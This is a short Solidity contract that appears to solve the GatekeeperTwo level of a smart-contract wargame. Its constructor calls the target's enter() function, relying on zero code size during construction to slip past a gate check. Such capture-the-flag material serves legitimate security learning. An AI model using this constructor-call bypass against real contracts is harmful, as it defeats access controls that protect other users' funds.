pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    // @dev constructor does not add to contract code size
    constructor(bytes8 _gateKey, address _gatekeeper) public {
        IGatekeeperTwo(_gatekeeper).enter(_gateKey);
    }
}